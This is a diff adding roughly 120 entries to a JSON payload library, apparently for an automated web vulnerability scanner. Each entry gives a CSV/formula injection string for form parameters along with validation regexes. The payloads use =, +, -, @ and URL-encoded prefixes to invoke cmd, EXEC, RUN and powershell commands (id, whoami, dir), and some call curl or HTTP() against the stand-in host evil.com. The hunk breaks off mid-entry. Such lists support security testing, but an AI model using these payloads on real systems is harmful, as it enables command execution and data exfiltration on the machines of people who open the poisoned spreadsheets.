@@ -130,5 +130,1325 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-74198",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=CMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74199",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=SUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74200",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=HTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74201",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=MALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74202",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=COM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74203",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=EXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74204",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=RUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74205",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=SHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74206",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74207",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74208",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74209",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "=cmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74210",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+CMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74211",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+SUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74212",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+HTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74213",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+MALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74214",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+COM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74215",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+EXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74216",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+RUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74217",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+SHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74218",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74219",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74220",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74221",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "+cmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74222",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-CMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74223",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-SUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74224",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-HTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74225",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-MALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74226",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-COM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74227",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-EXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74228",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-RUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74229",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-SHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74230",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74231",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74232",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74233",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "-cmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74234",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@CMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74235",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@SUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74236",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@HTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74237",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@MALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74238",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@COM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74239",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@EXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74240",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@RUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74241",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@SHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74242",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74243",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74244",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74245",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "@cmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74246",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3DCMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74247",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3DSUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74248",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3DHTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74249",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3DMALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74250",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3DCOM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74251",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3DEXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74252",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3DRUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74253",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3DSHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74254",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3D|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74255",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3D|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74256",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3D|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74257",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%3Dcmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74258",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2BCMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74259",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2BSUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74260",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2BHTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74261",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2BMALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74262",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2BCOM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74263",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2BEXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74264",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2BRUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74265",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2BSHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74266",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2B|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74267",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2B|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74268",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2B|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74269",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2Bcmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74270",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2DCMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74271",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2DSUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74272",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2DHTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74273",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2DMALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74274",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2DCOM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74275",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2DEXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74276",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2DRUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74277",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2DSHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74278",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2D|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74279",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2D|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74280",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2D|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74281",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%2Dcmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74282",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40CMD(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74283",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40SUM(1+1)*cmd(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74284",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40HTTP(\"http://evil.com/csv\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74285",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40MALICIOUS(\"test\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74286",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40COM(\"id\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74287",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40EXEC(\"whoami\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74288",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40RUN(\"cmd.exe /c dir\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74289",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40SHELL(\"curl http://evil.com\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74290",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40|id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74291",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40|curl http://evil.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74292",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40|powershell -c \"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74293",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%40cmd|\"id\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "CMD|HTTP|EXEC"
+    }
+  },
+  {
+    "payload_id": "OWP-74294",
+    "vulnerability_category": "Injection (CSV Injection)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
